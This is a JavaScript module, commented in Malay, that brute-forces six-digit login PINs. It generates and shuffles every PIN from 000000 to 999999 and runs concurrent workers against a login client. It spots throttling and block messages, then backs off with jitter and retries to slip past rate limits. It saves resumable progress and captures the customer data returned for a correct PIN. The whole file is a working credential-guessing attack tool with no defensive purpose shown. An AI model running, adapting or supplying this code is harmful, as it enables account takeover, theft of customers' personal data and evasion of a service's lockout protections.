import { setTimeout as sleep } from 'node:timers/promises';
import { log } from './logger.js';

const THROTTLE_HINTS = [
  'too many',
  'terlalu banyak',
  'rate',
  'limit',
  'cuba semula',
  'cuba lagi',
  'sila cuba',
  'try again',
  'sebentar',
  'blocked',
  'sekatan',
  'sementara',
];

export function classify(result) {
  const { httpStatus, json } = result;
  if (json?.status === true) return 'success';
  if (httpStatus === 429) return 'throttle';
  if (httpStatus >= 500 || httpStatus === 0) return 'server';
  if (json?.status === false) {
    const msg = String(json?.message ?? '').toLowerCase();
    if (THROTTLE_HINTS.some((h) => msg.includes(h))) return 'throttle';
    return 'wrong';
  }
  return 'unknown';
}

async function withRetry(fn, cfg, label) {
  let lastErr;
  for (let i = 0; i <= cfg.maxRetries; i++) {
    try {
      const res = await fn();
      if (res.httpStatus >= 500) throw new Error(`server ${res.httpStatus}`);
      return res;
    } catch (err) {
      lastErr = err;
      const wait = Math.min(500 * 2 ** i, 15000);
      log.warn(`${label}: ${err.message} — retry ${i + 1}/${cfg.maxRetries} dalam ${wait}ms`);
      await sleep(wait);
    }
  }
  throw lastErr;
}

/**
 * Jalankan brute force dengan kolam worker kongsi kursor.
 * state.nextIndex / state.attempts dikemas kini setiap iterasi supaya boleh resume.
 */
export async function runBrute({ client, pins, cfg, state, onFound }) {
  const total = pins.length;
  const startedAt = Date.now();
  let found = null;
  let stopped = false;
  let pausedUntil = 0;
  let throttleStreak = 0;
  let wrongSeen = 0;

  const waitIfPaused = async () => {
    const wait = pausedUntil - Date.now();
    if (wait > 0) await sleep(wait);
  };

  const throttle = () => {
    throttleStreak = Math.min(throttleStreak + 1, cfg.throttleMaxStreak);
    const wait = Math.min(cfg.throttleBaseMs * 2 ** (throttleStreak - 1), cfg.throttleMaxMs);
    pausedUntil = Math.max(pausedUntil, Date.now() + wait);
    log.warn(`had kadar (streak ${throttleStreak}) — jeda ${wait}ms`);
    return wait;
  };

  const worker = async (id) => {
    while (!stopped) {
      const index = state.nextIndex++;
      if (index >= total) return;
      const pin = pins[index];
      await waitIfPaused();
      if (stopped) return;

      let result;
      try {
        result = await withRetry(() => client.login(pin), cfg, `w${id} ${pin}`);
      } catch (err) {
        log.error(`w${id} ${pin} gagal sepenuhnya: ${err.message}`);
        continue;
      }

      let kind = classify(result);
      let guard = 0;
      while (kind === 'throttle' && guard++ < cfg.throttleMaxStreak + 3) {
        throttle();
        await waitIfPaused();
        try {
          result = await withRetry(() => client.login(pin), cfg, `w${id} ${pin}/throttle`);
          kind = classify(result);
        } catch (err) {
          log.error(`w${id} ${pin} gagal selepas throttle: ${err.message}`);
          kind = 'server';
          break;
        }
      }

      state.attempts++;

      if (kind === 'success') {
        found = { pin, customer: result.json?.data ?? null, at: new Date().toISOString() };
        stopped = true;
        onFound?.(found);
        return;
      }

      if (kind === 'wrong') {
        throttleStreak = 0;
        wrongSeen++;
        const msg = result.json?.message;
        if (wrongSeen === 1) log.info(`mesej rujukan PIN salah: "${msg ?? '-'}"`);
      } else if (kind === 'unknown') {
        log.warn(`respons tidak dikenali untuk ${pin}: ${JSON.stringify(result.json).slice(0, 200)}`);
        if (cfg.stopOnUnknown) {
          stopped = true;
          return;
        }
      }

      if (cfg.delayMs > 0 || cfg.jitterMs > 0) {
        await sleep(cfg.delayMs + Math.random() * cfg.jitterMs);
      }

      if (state.attempts % cfg.progressEvery === 0) {
        const elapsed = (Date.now() - startedAt) / 1000;
        const rate = state.attempts / Math.max(elapsed, 1);
        const left = total - state.nextIndex;
        const eta = rate > 0 ? Math.round(left / rate) : Infinity;
        const pct = ((state.nextIndex / total) * 100).toFixed(2);
        log.info(
          `${pct}% | ${state.nextIndex}/${total} | ${rate.toFixed(2)}/s | ETA ${fmt(eta)} | pin ${pin}`,
        );
      }
    }
  };

  const workers = Array.from({ length: Math.max(1, cfg.concurrency) }, (_, i) => worker(i + 1));
  await Promise.all(workers);
  return { found, stopped, elapsedMs: Date.now() - startedAt };
}

export function fmt(seconds) {
  if (!Number.isFinite(seconds)) return '~';
  const s = Math.max(0, Math.round(seconds));
  const h = Math.floor(s / 3600);
  const m = Math.floor((s % 3600) / 60);
  return h > 0 ? `${h}j ${m}m` : `${m}m ${s % 60}s`;
}

export function buildPins(start, end) {
  const from = Number(start);
  const to = Number(end);
  if (!Number.isInteger(from) || !Number.isInteger(to) || from < 0 || to > 999999 || from > to) {
    throw new Error('Julat PIN mesti integer 0..999999 dan start <= end');
  }
  const out = new Array(to - from + 1);
  for (let i = from; i <= to; i++) out[i - from] = String(i).padStart(6, '0');
  return out;
}

export function shufflePins(pins, seed) {
  let s = seed >>> 0 || Date.now() >>> 0;
  const rnd = () => {
    s |= 0;
    s = (s + 0x6d2b79f5) | 0;
    let t = Math.imul(s ^ (s >>> 15), 1 | s);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
  for (let i = pins.length - 1; i > 0; i--) {
    const j = Math.floor(rnd() * (i + 1));
    [pins[i], pins[j]] = [pins[j], pins[i]];
  }
  return pins;
}